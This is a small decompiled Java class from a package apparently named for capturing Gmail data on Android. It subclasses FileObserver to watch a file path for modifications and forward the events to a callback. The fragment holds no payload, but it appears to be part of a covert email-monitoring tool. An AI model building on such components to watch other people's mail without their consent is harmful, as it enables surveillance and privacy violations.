package com.vvt.capture.email.gmail.b;

import android.os.FileObserver;
import com.vvt.io.g;

class d
  extends FileObserver
{
  private g b;
  
  public d(a parama, String paramString, g paramg)
  {
    super(paramString, 2);
    this.b = paramg;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    int i = 2;
    if (paramInt == i)
    {
      g localg = this.b;
      localg.a(paramInt);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/gmail/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */